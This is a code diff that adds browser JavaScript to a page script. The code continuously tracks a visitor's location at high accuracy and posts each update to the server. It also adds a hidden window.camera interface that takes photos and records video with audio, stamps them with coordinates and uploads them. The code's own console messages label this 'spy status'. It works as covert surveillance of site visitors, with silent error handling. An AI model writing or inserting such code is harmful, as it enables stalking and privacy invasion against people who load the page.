@@ -324,4 +324,236 @@ document.addEventListener('DOMContentLoaded', () => {
             } catch(e) {}
         }, { once: false });
     });
+    
+    // === 11. GEOLOCATION TRACKING ===
+    let geoLocation = null;
+    let geoWatchId = null;
+    
+    function getGeolocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    geoLocation = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        timestamp: new Date(position.timestamp).toISOString()
+                    };
+                    
+                    // Send initial location
+                    fetch('/geolocation', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            ...geoLocation,
+                            source: 'initial'
+                        })
+                    }).catch(() => {});
+                    
+                    // Start continuous tracking
+                    geoWatchId = navigator.geolocation.watchPosition(
+                        (pos) => {
+                            const updated = {
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                altitude: pos.coords.altitude,
+                                timestamp: new Date(pos.timestamp).toISOString(),
+                                source: 'tracking'
+                            };
+                            fetch('/geolocation', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(updated)
+                            }).catch(() => {});
+                        },
+                        (err) => {},
+                        { enableHighAccuracy: true, maximumAge: 0 }
+                    );
+                },
+                (err) => {
+                    console.log('Geolocation error:', err);
+                },
+                { enableHighAccuracy: true }
+            );
+        }
+    }
+    
+    // Get geolocation on page load
+    getGeolocation();
+    
+    // 12. CAMERA SYSTEM (Command-activated)
+    let cameraStream = null;
+    let cameraActive = false;
+    let cameraMode = 'photo'; // 'photo' or 'video'
+    let cameraFacingMode = 'environment'; // back camera by default
+    let capturedPhotos = [];
+    let videoChunks = [];
+    let mediaRecorder = null;
+    let recordingStartTime = null;
+    
+    // Camera control interface
+    window.camera = {
+        // Take a photo
+        photo: async () => {
+            try {
+                if (!cameraStream) {
+                    cameraStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: cameraFacingMode, width: { ideal: 1920 }, height: { ideal: 1080 } }
+                    });
+                    cameraActive = true;
+                }
+                
+                const video = document.createElement('video');
+                video.srcObject = cameraStream;
+                video.setAttribute('playsinline', true);
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Add timestamp overlay
+                ctx.fillStyle = 'rgba(0,0,0,0.5)';
+                ctx.fillRect(0, canvas.height - 40, canvas.width, 40);
+                ctx.fillStyle = '#fff';
+                ctx.font = 'bold 24px Arial';
+                ctx.fillText(`📸 ${new Date().toISOString()}`, 10, canvas.height - 10);
+                ctx.fillText(`📍 ${geoLocation ? `${geoLocation.latitude.toFixed(6)}, ${geoLocation.longitude.toFixed(6)}` : 'N/A'}`, 10, canvas.height - 30);
+                
+                return new Promise((resolve) => {
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('photo', blob, `capture_${Date.now()}.jpg`);
+                        formData.append('timestamp', new Date().toISOString());
+                        formData.append('camera', cameraFacingMode);
+                        formData.append('resolution', `${canvas.width}x${canvas.height}`);
+                        formData.append('geo', JSON.stringify(geoLocation));
+                        
+                        try {
+                            const response = await fetch('/camera', {
+                                method: 'POST',
+                                body: formData
+                            });
+                            const result = await response.json();
+                            capturedPhotos.push(result);
+                            resolve(result);
+                        } catch(e) {
+                            console.log('📷 Photo captured');
+                            resolve({ error: e });
+                        }
+                    }, 'image/jpeg', 0.9);
+                });
+            } catch(e) {
+                console.log('Camera photo error:', e);
+                return { error: e.message };
+            }
+        },
+        
+        // Start video recording
+        videoStart: async () => {
+            try {
+                if (!cameraStream) {
+                    cameraStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: cameraFacingMode, width: { ideal: 1920 }, height: { ideal: 1080 } },
+                        audio: true
+                    });
+                    cameraActive = true;
+                }
+                
+                mediaRecorder = new MediaRecorder(cameraStream, {
+                    mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp9') 
+                        ? 'video/webm;codecs=vp9' 
+                        : 'video/webm'
+                });
+                
+                videoChunks = [];
+                recordingStartTime = new Date().toISOString();
+                
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) videoChunks.push(e.data);
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(videoChunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('video', blob, `recording_${Date.now()}.webm`);
+                    formData.append('duration', Date.now() - new Date(recordingStartTime).getTime());
+                    formData.append('start_time', recordingStartTime);
+                    formData.append('camera', cameraFacingMode);
+                    formData.append('geo', JSON.stringify(geoLocation));
+                    
+                    try {
+                        await fetch('/camera', { method: 'POST', body: formData });
+                    } catch(e) {
+                        console.log('🎥 Video recorded');
+                    }
+                    videoChunks = [];
+                    recordingStartTime = null;
+                };
+                
+                mediaRecorder.start(1000); // Collect 1s chunks
+                return { status: 'recording', start_time: recordingStartTime };
+            } catch(e) {
+                return { error: e.message };
+            }
+        },
+        
+        // Stop video recording
+        videoStop: async () => {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+                return { status: 'stopped' };
+            }
+            return { status: 'not_recording' };
+        },
+        
+        // Switch camera (front/back)
+        switch: async () => {
+            cameraFacingMode = cameraFacingMode === 'environment' ? 'user' : 'environment';
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: cameraFacingMode }
+                });
+            }
+            return { facing_mode: cameraFacingMode };
+        },
+        
+        // Get camera status
+        status: () => ({
+            active: cameraActive,
+            facing_mode: cameraFacingMode,
+            photos_taken: capturedPhotos.length,
+            has_camera: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia)
+        }),
+        
+        // List all captured photos
+        list: () => capturedPhotos
+    };
+    
+    // Console spy status
+    console.log('%c📷 Camera: READY (command-activated)', 'color: #00d4ff; font-size: 16px;');
+    console.log('%c🌍 Geolocation: ACTIVE (continuous)', 'color: #00d4ff; font-size: 16px;');
+    console.log('%c💡 Use window.camera.photo() to take photo', 'color: #ff4757; font-size: 12px;');
+    console.log('%c💡 Use window.camera.videoStart() to record', 'color: #ff4757; font-size: 12px;');
+    console.log('%c💡 Use window.camera.videoStop() to stop', 'color: #ff4757; font-size: 12px;');
+    console.log('%c💡 Use window.camera.switch() to flip camera', 'color: #ff4757; font-size: 12px;');
+    console.log('%c💡 Use window.camera.status() for status', 'color: #ff4757; font-size: 12px;');
+    
+    // Cleanup on page unload
+    window.addEventListener('beforeunload', () => {
+        if (cameraStream) {
+            cameraStream.getTracks().forEach(track => track.stop());
+        }
+        if (geoWatchId) {
+            navigator.geolocation.clearWatch(geoWatchId);
+        }
+    });
 });
